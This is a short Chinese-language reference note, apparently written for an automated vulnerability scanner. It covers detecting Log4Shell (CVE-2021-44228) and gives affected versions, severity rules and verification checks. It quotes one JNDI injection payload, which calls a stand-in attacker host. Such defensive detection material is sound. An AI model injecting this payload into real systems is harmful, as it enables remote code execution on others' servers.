# Log4Shell (CVE-2021-44228) 判断知识

Log4j 2.x（< 2.15.0）解析日志中的 `${jndi:ldap://attacker.com/a}` 触发 RCE，CVSS 10.0。
- **受影响**：log4j-core 2.0-beta9 ~ 2.14.1
- **部分缓解**：2.15.0
- **完全修复**：2.17.1+

## 判断规则

| 场景 | 严重度 |
|------|--------|
| 用户输入 → Logger + 版本 2.0~2.14.1 | **CRITICAL** |
| 用户输入 → Logger + 版本未知/2.15~2.16 | **HIGH** |
| 用户输入 → Logger + 版本 ≥ 2.17.1 | **LOW**（已修复） |
| 无用户输入流向 Logger | 安全，不上报 |

## 验证要点

- 首先检查 tech_profile 中的 log4j 版本
- 候选路径终点为 JNDI_LOOKUP sink 时直接确认——但本类别更关注日志调用
- 用 Grep 搜索 `logger.info`/`logger.error` 等调用，检查参数是否含 HTTP 请求值
- 检查 `log4j2.formatMsgNoLookups=true` 系统属性或环境变量（2.10+ 缓解）
- 检查 `LOG4J_FORMAT_MSG_NO_LOOKUPS` 环境变量

`rule_id` 命名：`log4shell-taint`、`log4j-version-vulnerable`。
